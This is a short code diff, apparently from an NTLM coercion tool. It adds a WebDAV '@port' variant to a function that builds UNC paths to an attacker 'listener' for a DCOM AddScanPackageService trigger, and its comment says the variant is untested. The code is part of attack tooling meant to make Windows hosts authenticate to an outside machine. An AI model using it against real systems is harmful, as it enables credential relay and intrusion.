@@ -60,8 +60,11 @@ def wsp_uri(listener):
     return f"file:////{listener}/share"
 
 
-def dcom_unc(listener):
-    """DCOM UNC path with random share/filename."""
+def dcom_unc(listener, listener_port=445):
+    """DCOM UNC path with random share/filename. WebDAV when port != 445, untested,
+    nobody has tried a WebDAV @port host for AddScanPackageService before."""
     share = "".join(random.choices(string.ascii_letters, k=4))
     fname = "".join(random.choices(string.ascii_letters, k=4))
+    if listener_port != 445:
+        return f"\\\\{listener}@{listener_port}\\{share}\\{fname}.txt"
     return f"\\\\{listener}\\{share}\\{fname}.txt"
